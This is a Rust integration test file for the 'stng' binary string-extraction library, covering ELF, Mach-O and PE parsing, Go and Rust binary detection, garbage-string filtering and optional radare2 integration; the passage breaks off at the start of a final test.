//! Integration tests for stng library.

use stng::{
    detect_language, extract_strings, extract_strings_with_options, is_garbage, is_go_binary,
    is_rust_binary, ExtractOptions, ExtractedString, StringKind, StringMethod,
};

// Test data: minimal ELF header for a 64-bit little-endian ELF
fn minimal_elf_header() -> Vec<u8> {
    let mut data = vec![0u8; 512];
    // ELF magic
    data[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
    // Class: 64-bit (2)
    data[4] = 2;
    // Endianness: little-endian (1)
    data[5] = 1;
    // Version
    data[6] = 1;
    // OS/ABI
    data[7] = 0;
    // Type: executable
    data[16..18].copy_from_slice(&[2, 0]);
    // Machine: x86_64 (0x3E)
    data[18..20].copy_from_slice(&[0x3E, 0]);
    // Version
    data[20..24].copy_from_slice(&[1, 0, 0, 0]);
    // Section header string table index
    data[62..64].copy_from_slice(&[0, 0]);
    data
}

// Test data: minimal Mach-O header for 64-bit
fn minimal_macho_header() -> Vec<u8> {
    let mut data = vec![0u8; 512];
    // Mach-O 64-bit magic
    data[0..4].copy_from_slice(&[0xCF, 0xFA, 0xED, 0xFE]);
    // CPU type: x86_64 (0x01000007)
    data[4..8].copy_from_slice(&[0x07, 0x00, 0x00, 0x01]);
    // CPU subtype
    data[8..12].copy_from_slice(&[0x03, 0x00, 0x00, 0x00]);
    // File type: executable (2)
    data[12..16].copy_from_slice(&[0x02, 0x00, 0x00, 0x00]);
    // Number of load commands
    data[16..20].copy_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    // Size of load commands
    data[20..24].copy_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    data
}

#[test]
fn test_extract_strings_empty_data() {
    let strings = extract_strings(&[], 4);
    assert!(strings.is_empty());
}

#[test]
fn test_extract_strings_from_printable_data() {
    // Printable data should be extracted (like traditional `strings`)
    let data = b"not a valid binary format at all";
    let strings = extract_strings(data, 4);
    // Should find the printable string
    assert!(!strings.is_empty());
}

#[test]
fn test_extract_strings_pure_binary() {
    // Pure binary data with no printable runs should return empty
    let data = &[0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07];
    let strings = extract_strings(data, 4);
    assert!(strings.is_empty());
}

#[test]
fn test_extract_strings_minimal_elf() {
    let data = minimal_elf_header();
    let strings = extract_strings(&data, 4);
    // Minimal ELF with no sections should return empty
    assert!(strings.is_empty());
}

#[test]
fn test_extract_strings_minimal_macho() {
    let data = minimal_macho_header();
    let strings = extract_strings(&data, 4);
    // Minimal Mach-O with no segments should return empty
    assert!(strings.is_empty());
}

#[test]
fn test_detect_language_empty() {
    assert_eq!(detect_language(&[]), "unknown");
}

#[test]
fn test_detect_language_text() {
    // Plain text should be detected as "text"
    assert_eq!(detect_language(b"not a binary"), "text");
}

#[test]
fn test_detect_language_binary_garbage() {
    // Binary garbage should be "unknown"
    assert_eq!(detect_language(&[0x00, 0x01, 0x02, 0x03, 0x04]), "unknown");
}

#[test]
fn test_detect_language_elf() {
    let data = minimal_elf_header();
    assert_eq!(detect_language(&data), "unknown"); // No Go/Rust sections
}

#[test]
fn test_is_go_binary_empty() {
    assert!(!is_go_binary(&[]));
}

#[test]
fn test_is_go_binary_invalid() {
    assert!(!is_go_binary(b"not a binary"));
}

#[test]
fn test_is_rust_binary_empty() {
    assert!(!is_rust_binary(&[]));
}

#[test]
fn test_is_rust_binary_invalid() {
    assert!(!is_rust_binary(b"not a binary"));
}

#[test]
fn test_extract_options_new() {
    let opts = ExtractOptions::new(4);
    assert_eq!(opts.min_length, 4);
    assert!(!opts.use_r2);
    assert!(opts.path.is_none());
}

#[test]
fn test_extract_options_with_r2() {
    let opts = ExtractOptions::new(4).with_r2("/path/to/binary");
    assert_eq!(opts.min_length, 4);
    assert!(opts.use_r2);
    assert_eq!(opts.path, Some("/path/to/binary".to_string()));
}

#[test]
fn test_extract_strings_with_options_empty() {
    let opts = ExtractOptions::new(4);
    let strings = extract_strings_with_options(&[], &opts);
    assert!(strings.is_empty());
}

// Garbage detection tests
#[test]
fn test_is_garbage_valid_strings() {
    assert!(!is_garbage("Hello World"));
    assert!(!is_garbage("go1.22.0"));
    assert!(!is_garbage("/usr/lib/go"));
    assert!(!is_garbage("runtime.memequal"));
    assert!(!is_garbage("SIGFPE: floating-point exception"));
    assert!(!is_garbage("Bool"));
    assert!(!is_garbage("Time"));
    assert!(!is_garbage("linux"));
    assert!(!is_garbage("amd64"));
    assert!(!is_garbage("https://example.com"));
    assert!(!is_garbage("ERROR_CODE_123"));
}

#[test]
fn test_is_garbage_empty_and_short() {
    assert!(is_garbage(""));
    assert!(is_garbage(" "));
    assert!(is_garbage("a")); // Single char
}

#[test]
fn test_is_garbage_control_chars() {
    assert!(is_garbage("ab\x00cd"));
    assert!(is_garbage("\x01\x02\x03"));
    assert!(is_garbage("hello\x00world"));
}

#[test]
fn test_is_garbage_misaligned_patterns() {
    assert!(is_garbage("asL "));
    assert!(is_garbage("``L "));
    assert!(is_garbage("dL "));
    assert!(is_garbage("`L "));
}

#[test]
fn test_is_garbage_short_mixed_case() {
    assert!(is_garbage("P9O"));
    assert!(is_garbage("8ZAj"));
    assert!(is_garbage("pIo2"));
}

#[test]
fn test_is_garbage_all_caps_short_ok() {
    // All caps short strings are OK
    assert!(!is_garbage("API"));
    assert!(!is_garbage("HTTP"));
    assert!(!is_garbage("GET"));
}

#[test]
fn test_is_garbage_all_lowercase_short_ok() {
    assert!(!is_garbage("foo"));
    assert!(!is_garbage("bar"));
    assert!(!is_garbage("test"));
}

#[test]
fn test_is_garbage_all_digits_short_ok() {
    assert!(!is_garbage("1234"));
    assert!(!is_garbage("2024"));
}

#[test]
fn test_is_garbage_repeated_chars() {
    assert!(is_garbage("aaaa"));
    assert!(is_garbage("...."));
    assert!(is_garbage("----"));
}

#[test]
fn test_is_garbage_excessive_whitespace() {
    assert!(is_garbage("   a   ")); // Single char after trim
                                    // "ab cd" after trim has proper content, may not be garbage
}

#[test]
fn test_is_garbage_unicode_endings() {
    assert!(is_garbage("333333ӿ"));
    assert!(is_garbage("abcӿ"));
}

#[test]
fn test_is_garbage_noise_punctuation() {
    assert!(is_garbage("@#$%"));
    assert!(is_garbage("@E?"));
    assert!(is_garbage("P$O"));
}

#[test]
fn test_is_garbage_hex_patterns() {
    // These are actually valid lowercase strings
    // The is_garbage function allows all-lowercase short strings
    assert!(!is_garbage("deadbeef")); // All lowercase, allowed
                                      // Mixed case short patterns that look like garbage
    assert!(is_garbage("0a1b2c3d")); // Has digits mixed with letters
}

// Test StringKind variants
#[test]
fn test_string_kind_default() {
    let kind: StringKind = Default::default();
    assert_eq!(kind, StringKind::Const);
}

// Test StringMethod display
#[test]
fn test_string_method_variants() {
    let methods = vec![
        StringMethod::Structure,
        StringMethod::InstructionPattern,
        StringMethod::RawScan,
        StringMethod::Heuristic,
        StringMethod::R2String,
        StringMethod::R2Symbol,
    ];
    for method in methods {
        // Just verify they can be formatted
        let _ = format!("{:?}", method);
    }
}

// Test ExtractedString
#[test]
fn test_extracted_string_serialization() {
    let s = ExtractedString {
        value: "test".to_string(),
        data_offset: 0x1000,
        section: Some("__rodata".to_string()),
        method: StringMethod::Structure,
        kind: StringKind::Const,
        library: None,
        fragments: None,
        ..Default::default()
    };

    let json = serde_json::to_string(&s).unwrap();
    assert!(json.contains("\"value\":\"test\""));
    assert!(json.contains("\"data_offset\":4096"));
}

#[test]
fn test_extracted_string_with_library() {
    let s = ExtractedString {
        value: "_printf".to_string(),
        data_offset: 0x2000,
        section: None,
        method: StringMethod::Structure,
        kind: StringKind::Import,
        library: Some("libSystem.B.dylib".to_string()),
        fragments: None,
        ..Default::default()
    };

    let json = serde_json::to_string(&s).unwrap();
    assert!(json.contains("\"library\":\"libSystem.B.dylib\""));
}

#[test]
fn test_extracted_string_without_library_skips_field() {
    let s = ExtractedString {
        value: "test".to_string(),
        data_offset: 0x1000,
        section: None,
        method: StringMethod::Structure,
        kind: StringKind::Const,
        library: None,
        fragments: None,
        ..Default::default()
    };

    let json = serde_json::to_string(&s).unwrap();
    // library field should be skipped when None
    assert!(!json.contains("\"library\""));
}

// Tests using real system binaries for higher coverage
mod real_binary_tests {
    use super::*;
    use std::path::Path;

    fn get_real_binary() -> Option<Vec<u8>> {
        let paths = ["/bin/ls", "/usr/bin/ls", "/bin/cat", "/usr/bin/cat"];
        for path in paths {
            if Path::new(path).exists() {
                if let Ok(data) = std::fs::read(path) {
                    return Some(data);
                }
            }
        }
        None
    }

    #[test]
    fn test_extract_strings_real_binary() {
        let Some(data) = get_real_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        // Real binaries should have some strings
        assert!(!strings.is_empty(), "Real binary should have strings");
    }

    #[test]
    fn test_detect_language_real_binary() {
        let Some(data) = get_real_binary() else {
            return;
        };

        let lang = detect_language(&data);
        // Real system binary is typically C/unknown
        assert!(["unknown", "c", "rust", "go"].contains(&lang));
    }

    #[test]
    fn test_is_go_binary_real_binary() {
        let Some(data) = get_real_binary() else {
            return;
        };

        // System binaries are typically not Go
        let result = is_go_binary(&data);
        assert!(!result, "System binary should not be Go");
    }

    #[test]
    fn test_is_rust_binary_real_binary() {
        let Some(data) = get_real_binary() else {
            return;
        };

        // System binaries are typically not Rust
        let result = is_rust_binary(&data);
        assert!(!result, "System binary should not be Rust");
    }

    #[test]
    fn test_extract_with_options_real_binary() {
        let Some(data) = get_real_binary() else {
            return;
        };

        let opts = ExtractOptions::new(4);
        let strings = extract_strings_with_options(&data, &opts);
        assert!(!strings.is_empty());
    }

    #[test]
    fn test_extract_with_min_length_variations() {
        let Some(data) = get_real_binary() else {
            return;
        };

        let strings_4 = extract_strings(&data, 4);
        let strings_10 = extract_strings(&data, 10);
        let strings_20 = extract_strings(&data, 20);

        // More restrictive min_length should yield fewer or equal strings
        assert!(strings_10.len() <= strings_4.len());
        assert!(strings_20.len() <= strings_10.len());
    }

    #[test]
    fn test_extracted_strings_have_valid_values() {
        let Some(data) = get_real_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        for s in &strings {
            // Strings should be valid UTF-8 (they're already String type)
            assert!(!s.value.is_empty());
            // Note: Some strings (imports/symbols) may be shorter than min_length
            // The min_length filter applies to extracted strings, not imports
        }
    }

    #[test]
    fn test_string_kinds_are_valid() {
        let Some(data) = get_real_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        for s in &strings {
            // All StringKind variants should be valid
            let _ = format!("{:?}", s.kind);
            let _ = format!("{:?}", s.method);
        }
    }

    #[test]
    fn test_sections_are_reasonable() {
        let Some(data) = get_real_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        for s in &strings {
            if let Some(ref section) = s.section {
                // Section names should not be empty
                assert!(!section.is_empty());
            }
        }
    }
}

// Tests using real Go binaries
mod go_binary_tests {
    use super::*;
    use std::path::Path;

    fn get_go_binary() -> Option<Vec<u8>> {
        // Try common Go binary locations
        let go_path = std::process::Command::new("which")
            .arg("go")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.trim().to_string());

        if let Some(path) = go_path {
            if Path::new(&path).exists() {
                return std::fs::read(&path).ok();
            }
        }

        // Try standard locations
        let paths = [
            "/opt/homebrew/bin/go",
            "/usr/local/go/bin/go",
            "/usr/bin/go",
        ];
        for path in paths {
            if Path::new(path).exists() {
                if let Ok(data) = std::fs::read(path) {
                    return Some(data);
                }
            }
        }
        None
    }

    #[test]
    fn test_detect_go_binary() {
        let Some(data) = get_go_binary() else {
            return;
        };

        let is_go = is_go_binary(&data);
        assert!(is_go, "Go binary should be detected as Go");
    }

    #[test]
    fn test_detect_language_go() {
        let Some(data) = get_go_binary() else {
            return;
        };

        let lang = detect_language(&data);
        assert_eq!(lang, "go", "Go binary should be detected as 'go'");
    }

    #[test]
    fn test_extract_strings_go_binary() {
        let Some(data) = get_go_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        assert!(!strings.is_empty(), "Go binary should have many strings");

        // Go binaries typically have thousands of strings
        assert!(
            strings.len() > 100,
            "Expected many strings from Go binary, got {}",
            strings.len()
        );
    }

    #[test]
    fn test_go_binary_has_go_strings() {
        let Some(data) = get_go_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);

        // Go binaries should have typical Go runtime strings
        let has_runtime = strings.iter().any(|s| s.value.contains("runtime"));
        let has_go_version = strings.iter().any(|s| s.value.contains("go1."));

        // At least one should be true
        assert!(
            has_runtime || has_go_version,
            "Go binary should have runtime or version strings"
        );
    }

    #[test]
    fn test_go_binary_has_funcname_kinds() {
        let Some(data) = get_go_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);

        // Go binaries should extract strings successfully
        // Modern Go binaries may have different internal structures
        // Just verify we extracted some reasonable strings
        assert!(
            !strings.is_empty(),
            "Go binary should have some extracted strings"
        );

        // If we do find FuncName strings, that's great, but not required
        let _has_funcname = strings.iter().any(|s| s.kind == StringKind::FuncName);
    }
}

// Tests using real Rust binaries
mod rust_binary_tests {
    use super::*;
    use std::env;
    use std::path::Path;

    fn get_rust_binary() -> Option<Vec<u8>> {
        // Try the current project's binary first (guaranteed to exist)
        let self_binary = env!("CARGO_BIN_EXE_stng");
        if Path::new(self_binary).exists() {
            return std::fs::read(self_binary).ok();
        }

        // Try cargo bin directory
        if let Some(home) = env::var_os("HOME") {
            let cargo_bin = Path::new(&home).join(".cargo/bin");
            if cargo_bin.exists() {
                // Try to find a small Rust binary
                if let Ok(entries) = std::fs::read_dir(&cargo_bin) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if path.is_file() {
                            // Skip very large binaries for faster tests
                            if let Ok(meta) = std::fs::metadata(&path) {
                                if meta.len() < 50_000_000 {
                                    // < 50MB
                                    if let Ok(data) = std::fs::read(&path) {
                                        // Verify it's actually a Rust binary
                                        if is_rust_binary(&data) {
                                            return Some(data);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        None
    }

    #[test]
    fn test_self_binary_detection() {
        // Test against our own binary
        let self_path = env!("CARGO_BIN_EXE_stng");
        if !Path::new(self_path).exists() {
            return;
        }

        let data = std::fs::read(self_path).unwrap();

        // Our binary might be detected as Rust depending on build
        let _lang = detect_language(&data);
        let _is_rust = is_rust_binary(&data);

        // Just verify extraction doesn't panic
        let strings = extract_strings(&data, 4);
        assert!(!strings.is_empty(), "Self binary should have strings");
    }

    #[test]
    fn test_self_binary_with_options() {
        let self_path = env!("CARGO_BIN_EXE_stng");
        if !Path::new(self_path).exists() {
            return;
        }

        let data = std::fs::read(self_path).unwrap();

        // Test with various options
        let opts = ExtractOptions::new(6).with_garbage_filter(true);
        let strings = extract_strings_with_options(&data, &opts);
        assert!(!strings.is_empty());

        // All strings should be >= 6 chars (mostly - imports might be shorter)
        // Just verify it doesn't panic
    }

    #[test]
    fn test_self_binary_extract_from_object() {
        let self_path = env!("CARGO_BIN_EXE_stng");
        if !Path::new(self_path).exists() {
            return;
        }

        let data = std::fs::read(self_path).unwrap();
        let opts = ExtractOptions::new(4);
        let strings = stng::extract_strings_with_options(&data, &opts);
        assert!(!strings.is_empty());
    }

    #[test]
    fn test_self_binary_string_kinds() {
        let self_path = env!("CARGO_BIN_EXE_stng");
        if !Path::new(self_path).exists() {
            return;
        }

        let data = std::fs::read(self_path).unwrap();
        let strings = extract_strings(&data, 4);

        // Should have various kinds of strings
        let has_const = strings.iter().any(|s| s.kind == StringKind::Const);
        let has_import = strings.iter().any(|s| s.kind == StringKind::Import);

        assert!(
            has_const || has_import,
            "Should have Const or Import strings"
        );
    }

    #[test]
    fn test_extract_strings_rust_binary() {
        let Some(data) = get_rust_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        assert!(!strings.is_empty(), "Rust binary should have strings");
    }

    #[test]
    fn test_rust_binary_has_rust_strings() {
        let Some(data) = get_rust_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);

        // Rust binaries often have typical Rust strings
        let has_rust_hint = strings.iter().any(|s| {
            s.value.contains("rust")
                || s.value.contains("panic")
                || s.value.contains("unwrap")
                || s.value.contains("core::")
                || s.value.contains("std::")
        });

        // May not always be true depending on binary, so just log
        if !has_rust_hint {
            eprintln!("Note: No typical Rust strings found in binary");
        }
    }
}

// Tests for edge cases and corner cases
// Additional tests for specific extraction scenarios
mod extraction_scenario_tests {
    use super::*;

    #[test]
    fn test_extract_with_r2_option_no_r2_installed() {
        let data = minimal_elf_header();
        // Test with r2 option but no path
        let opts = ExtractOptions::new(4).with_r2("/nonexistent/path");
        let strings = extract_strings_with_options(&data, &opts);
        // Should still work, just without r2 results
        let _ = strings;
    }

    #[test]
    fn test_extract_unknown_binary_format() {
        // Random data that isn't ELF, Mach-O, or PE
        let data = b"RANDOMDATANOTABINARYFORMAT123456789";
        let strings = extract_strings(data, 4);
        // May extract raw strings or return empty
        let _ = strings;
    }

    #[test]
    fn test_extract_corrupted_elf() {
        let mut data = minimal_elf_header();
        // Corrupt the header
        data[16] = 0xFF;
        data[17] = 0xFF;
        let strings = extract_strings(&data, 4);
        // Should handle gracefully
        let _ = strings;
    }

    #[test]
    fn test_extract_corrupted_macho() {
        let mut data = minimal_macho_header();
        // Set invalid CPU type
        data[4..8].copy_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF]);
        let strings = extract_strings(&data, 4);
        // Should handle gracefully
        let _ = strings;
    }

    #[test]
    fn test_extract_very_small_binary() {
        // Just the magic bytes for ELF
        let data = vec![0x7f, b'E', b'L', b'F'];
        let strings = extract_strings(&data, 4);
        assert!(strings.is_empty());
    }

    #[test]
    fn test_extract_very_small_macho() {
        // Just the magic bytes for Mach-O
        let data = vec![0xCF, 0xFA, 0xED, 0xFE];
        let strings = extract_strings(&data, 4);
        assert!(strings.is_empty());
    }
}

// Tests for fat Mach-O binaries
mod fat_binary_tests {
    use super::*;
    use std::path::Path;

    fn get_fat_binary() -> Option<Vec<u8>> {
        // /bin/ls is a fat binary on macOS
        let path = "/bin/ls";
        if Path::new(path).exists() {
            std::fs::read(path).ok()
        } else {
            None
        }
    }

    #[test]
    fn test_fat_binary_extract_strings() {
        let Some(data) = get_fat_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        assert!(!strings.is_empty(), "Fat binary should have strings");
    }

    #[test]
    fn test_fat_binary_detect_language() {
        let Some(data) = get_fat_binary() else {
            return;
        };

        let lang = detect_language(&data);
        // System binaries are typically C/unknown
        assert_eq!(lang, "unknown");
    }

    #[test]
    fn test_fat_binary_not_go() {
        let Some(data) = get_fat_binary() else {
            return;
        };

        assert!(!is_go_binary(&data), "Fat system binary should not be Go");
    }

    #[test]
    fn test_fat_binary_not_rust() {
        let Some(data) = get_fat_binary() else {
            return;
        };

        assert!(
            !is_rust_binary(&data),
            "Fat system binary should not be Rust"
        );
    }

    #[test]
    fn test_fat_binary_with_options() {
        let Some(data) = get_fat_binary() else {
            return;
        };

        let opts = ExtractOptions::new(8);
        let strings = extract_strings_with_options(&data, &opts);
        assert!(!strings.is_empty());
    }

    #[test]
    fn test_fat_binary_has_imports() {
        let Some(data) = get_fat_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);

        // System binaries should have imports
        let has_imports = strings.iter().any(|s| s.kind == StringKind::Import);
        assert!(has_imports, "Fat binary should have imports");
    }
}

// Tests for r2 integration (only run if r2 is installed)
mod r2_tests {
    use super::*;
    use std::path::Path;
    use std::process::Command;

    fn r2_available() -> bool {
        Command::new("r2")
            .arg("-v")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }

    #[test]
    fn test_r2_extract_strings() {
        if !r2_available() {
            eprintln!("Skipping: r2 not installed");
            return;
        }

        let path = "/bin/ls";
        if !Path::new(path).exists() {
            return;
        }

        let result = stng::r2::extract_strings(path, 4, true);
        assert!(result.is_some(), "r2 should extract strings from /bin/ls");

        let strings = result.unwrap();
        assert!(!strings.is_empty(), "r2 should find strings");
    }

    #[test]
    fn test_r2_is_available() {
        // Just verify the function works
        let available = stng::r2::is_available();
        if available {
            eprintln!("r2 is available");
        } else {
            eprintln!("r2 is not available");
        }
    }

    #[test]
    fn test_r2_nonexistent_file() {
        if !r2_available() {
            return;
        }

        let result = stng::r2::extract_strings("/nonexistent/path/to/binary", 4, true);
        assert!(
            result.is_none(),
            "r2 should return None for nonexistent file"
        );
    }

    #[test]
    fn test_extract_with_r2_option() {
        if !r2_available() {
            return;
        }

        let path = "/bin/ls";
        if !Path::new(path).exists() {
            return;
        }

        let data = std::fs::read(path).unwrap();
        let opts = ExtractOptions::new(4).with_r2(path);
        let strings = extract_strings_with_options(&data, &opts);

        assert!(
            !strings.is_empty(),
            "Extraction with r2 should find strings"
        );
    }

    #[test]
    fn test_r2_strings_have_method() {
        if !r2_available() {
            return;
        }

        let path = "/bin/ls";
        if !Path::new(path).exists() {
            return;
        }

        let result = stng::r2::extract_strings(path, 4, true);
        if let Some(strings) = result {
            // r2 strings should have R2String or R2Symbol method
            for s in &strings {
                assert!(
                    s.method == StringMethod::R2String || s.method == StringMethod::R2Symbol,
                    "r2 extracted string should have r2 method"
                );
            }
        }
    }
}

// Tests using cross-compiled ELF and PE binaries
mod cross_compiled_tests {
    use super::*;
    use std::path::Path;

    fn get_go_elf_binary() -> Option<Vec<u8>> {
        let path = concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/testdata/hello_linux_amd64"
        );
        if Path::new(path).exists() {
            std::fs::read(path).ok()
        } else {
            None
        }
    }

    fn get_go_pe_binary() -> Option<Vec<u8>> {
        let path = concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/testdata/hello_windows.exe"
        );
        if Path::new(path).exists() {
            std::fs::read(path).ok()
        } else {
            None
        }
    }

    // ELF Go binary tests
    #[test]
    fn test_elf_go_binary_detection() {
        let Some(data) = get_go_elf_binary() else {
            eprintln!("Skipping: ELF Go binary not found");
            return;
        };

        assert!(
            is_go_binary(&data),
            "ELF Go binary should be detected as Go"
        );
    }

    #[test]
    fn test_elf_go_detect_language() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        let lang = detect_language(&data);
        assert_eq!(lang, "go", "ELF Go binary should be detected as 'go'");
    }

    #[test]
    fn test_elf_go_extract_strings() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        assert!(!strings.is_empty(), "ELF Go binary should have strings");

        // Go binaries should have many strings
        assert!(
            strings.len() > 100,
            "Expected many strings from Go ELF, got {}",
            strings.len()
        );
    }

    #[test]
    fn test_elf_go_has_runtime_strings() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);

        // Go binaries should have runtime strings
        let has_runtime = strings.iter().any(|s| s.value.contains("runtime"));
        assert!(has_runtime, "ELF Go binary should have runtime strings");
    }

    #[test]
    fn test_elf_go_has_gopclntab_strings() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);

        // Should extract strings successfully from Go ELF binaries
        assert!(
            !strings.is_empty(),
            "ELF Go binary should have extracted strings"
        );

        // Modern Go binaries may not have traditional gopclntab structure
        let _has_func = strings.iter().any(|s| s.kind == StringKind::FuncName);
    }

    #[test]
    fn test_elf_go_has_filepath_strings() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);

        // Should extract strings successfully
        assert!(
            !strings.is_empty(),
            "ELF Go binary should have extracted strings"
        );

        // File paths may or may not be present depending on build flags
        let _has_path = strings
            .iter()
            .any(|s| s.kind == StringKind::FilePath || s.kind == StringKind::Path);
    }

    // PE Go binary tests
    #[test]
    fn test_pe_go_binary_detection() {
        let Some(data) = get_go_pe_binary() else {
            eprintln!("Skipping: PE Go binary not found");
            return;
        };

        // PE detection may not identify Go specifically
        let is_go = is_go_binary(&data);
        // Just verify it doesn't panic and returns a boolean
        let _ = is_go;
    }

    #[test]
    fn test_pe_go_extract_strings() {
        let Some(data) = get_go_pe_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);
        assert!(!strings.is_empty(), "PE Go binary should have strings");
    }

    #[test]
    fn test_pe_go_has_strings() {
        let Some(data) = get_go_pe_binary() else {
            return;
        };

        let strings = extract_strings(&data, 4);

        // PE Go binaries should have some recognizable strings
        let has_hello = strings.iter().any(|s| s.value.contains("Hello"));
        let has_runtime = strings.iter().any(|s| s.value.contains("runtime"));

        assert!(
            has_hello || has_runtime,
            "PE Go binary should have Hello or runtime strings"
        );
    }

    #[test]
    fn test_elf_not_rust() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        assert!(
            !is_rust_binary(&data),
            "Go ELF should not be detected as Rust"
        );
    }

    #[test]
    fn test_pe_not_rust() {
        let Some(data) = get_go_pe_binary() else {
            return;
        };

        assert!(
            !is_rust_binary(&data),
            "Go PE should not be detected as Rust"
        );
    }

    #[test]
    fn test_elf_extract_with_options() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        let opts = ExtractOptions::new(10);
        let strings = extract_strings_with_options(&data, &opts);
        assert!(!strings.is_empty());
    }

    #[test]
    fn test_pe_extract_with_options() {
        let Some(data) = get_go_pe_binary() else {
            return;
        };

        let opts = ExtractOptions::new(10);
        let strings = extract_strings_with_options(&data, &opts);
        assert!(!strings.is_empty());
    }

    #[test]
    fn test_elf_go_with_garbage_filter() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        let opts_filtered = ExtractOptions::new(4).with_garbage_filter(true);
        let opts_unfiltered = ExtractOptions::new(4).with_garbage_filter(false);

        let filtered = extract_strings_with_options(&data, &opts_filtered);
        let unfiltered = extract_strings_with_options(&data, &opts_unfiltered);

        assert!(unfiltered.len() >= filtered.len());
    }

    #[test]
    fn test_pe_go_with_garbage_filter() {
        let Some(data) = get_go_pe_binary() else {
            return;
        };

        let opts_filtered = ExtractOptions::new(4).with_garbage_filter(true);
        let opts_unfiltered = ExtractOptions::new(4).with_garbage_filter(false);

        let filtered = extract_strings_with_options(&data, &opts_filtered);
        let unfiltered = extract_strings_with_options(&data, &opts_unfiltered);

        assert!(unfiltered.len() >= filtered.len());
    }

    #[test]
    fn test_elf_extract_from_object() {
        let Some(data) = get_go_elf_binary() else {
            return;
        };

        let opts = ExtractOptions::new(4);
        let strings = extract_strings_with_options(&data, &opts);

        assert!(!strings.is_empty());
    }

    #[test]
    fn test_pe_extract_from_object() {
        let Some(data) = get_go_pe_binary() else {
            return;
        };

        let opts = ExtractOptions::new(4);
        let strings = extract_strings_with_options(&data, &opts);

        assert!(!strings.is_empty());
    }
}

// Tests for the new API features
mod api_tests {
    use super::*;

    #[test]
    fn test_extract_from_object_api() {
        let data = std::fs::read("/bin/ls").unwrap();
        let opts = ExtractOptions::new(4);
        let strings = stng::extract_strings_with_options(&data, &opts);
        assert!(!strings.is_empty());
    }

    #[test]
    fn test_extract_from_object_with_preextracted_r2() {
        let data = std::fs::read("/bin/ls").unwrap();

        // Create fake pre-extracted r2 strings
        let fake_r2 = vec![ExtractedString {
            value: "fake_r2_string".to_string(),
            data_offset: 0x1000,
            section: None,
            method: StringMethod::R2String,
            kind: StringKind::Const,
            library: None,
            fragments: None,
            ..Default::default()
        }];

        let opts = ExtractOptions::new(4).with_r2_strings(fake_r2);
        let strings = stng::extract_strings_with_options(&data, &opts);

        // Should include our fake r2 string
        assert!(strings.iter().any(|s| s.value == "fake_r2_string"));
    }

    #[test]
    fn test_goblin_reexport() {
        // Verify goblin is properly re-exported
        let data = std::fs::read("/bin/ls").unwrap();
        let _object = stng::goblin::Object::parse(&data).unwrap();
    }

    #[test]
    fn test_extract_options_builder_chain() {
        let fake_strings = vec![ExtractedString {
            value: "test".to_string(),
            data_offset: 0,
            section: None,
            method: StringMethod::R2String,
            kind: StringKind::Const,
            library: None,
            fragments: None,
            ..Default::default()
        }];

        let opts = ExtractOptions::new(8)
            .with_r2("/path/to/binary")
            .with_r2_strings(fake_strings);

        assert_eq!(opts.min_length, 8);
        assert!(opts.use_r2);
        assert!(opts.path.is_some());
        assert!(opts.r2_strings.is_some());
    }

    #[test]
    fn test_extract_from_elf_object() {
        let path = concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/testdata/hello_linux_amd64"
        );
        if !std::path::Path::new(path).exists() {
            return;
        }

        let data = std::fs::read(path).unwrap();
        let opts = ExtractOptions::new(4);
        let strings = stng::extract_strings_with_options(&data, &opts);

        assert!(!strings.is_empty());
    }

    #[test]
    fn test_extract_from_pe_object() {
        let path = concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/testdata/hello_windows.exe"
        );
        if !std::path::Path::new(path).exists() {
            return;
        }

        let data = std::fs::read(path).unwrap();
        let opts = ExtractOptions::new(4);
        let strings = stng::extract_strings_with_options(&data, &opts);

        assert!(!strings.is_empty());
    }
}

// Tests for garbage filtering
mod filter_tests {
    use super::*;

    #[test]
    fn test_garbage_filter_enabled() {
        let data = std::fs::read("/bin/ls").unwrap();
        let opts_filtered = ExtractOptions::new(4).with_garbage_filter(true);
        let opts_unfiltered = ExtractOptions::new(4).with_garbage_filter(false);

        let filtered = extract_strings_with_options(&data, &opts_filtered);
        let unfiltered = extract_strings_with_options(&data, &opts_unfiltered);

        // Unfiltered should have more or equal strings
        assert!(unfiltered.len() >= filtered.len());
    }

    #[test]
    fn test_garbage_filter_removes_garbage() {
        let data = std::fs::read("/bin/ls").unwrap();
        let opts = ExtractOptions::new(4).with_garbage_filter(true);
        let strings = extract_strings_with_options(&data, &opts);

        // All strings should pass is_garbage check, except for special kinds
        // that are exempt from garbage filtering (Section, EntitlementsXml)
        for s in &strings {
            if s.kind != StringKind::Section && s.kind != StringKind::EntitlementsXml {
                assert!(
                    !is_garbage(&s.value),
                    "Found garbage string: {} (kind: {:?})",
                    s.value,
                    s.kind
                );
            }
        }
    }

    #[test]
